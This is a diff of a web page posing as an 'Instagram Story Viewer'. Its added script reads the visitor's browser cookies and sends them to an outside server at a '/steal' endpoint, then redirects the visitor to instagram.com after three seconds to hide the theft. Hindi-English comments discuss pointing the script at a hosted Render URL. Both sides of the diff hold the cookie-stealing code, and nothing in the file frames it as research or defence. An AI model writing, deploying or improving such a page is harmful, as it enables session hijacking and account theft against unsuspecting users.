@@ -1,16 +1,15 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h1>🔥 Instagram Story Viewer</h1>
-    <p>Loading your stories...</p>
-    <script>
-        var cookie = document.cookie;
-        
-        // ⚡ YAHAN CHANGE HUA HAI — Render URL daalna hai
-        // Abhi localhost hai, baad mein Render ka URL daal denge
-        fetch('https://hacking-project-vosb.onrender.com/steal?cookie=' + cookie);
-        
+<script>
+    var cookie = document.cookie;
+    
+    console.log('📤 Sending cookie:', cookie);
+    
+    fetch('https://hacking-project-vosb.onrender.com/steal?cookie=' + encodeURIComponent(cookie))
+        .then(response => response.text())
+        .then(data => console.log('✅ Server response:', data))
+        .catch(err => console.log('❌ Error:', err));
+    
+    // 3 second baad Instagram pe redirect
+    setTimeout(function() {
         window.location.href = 'https://instagram.com';
-    </script>
-</body>
-</html>
+    }, 3000);
+</script>
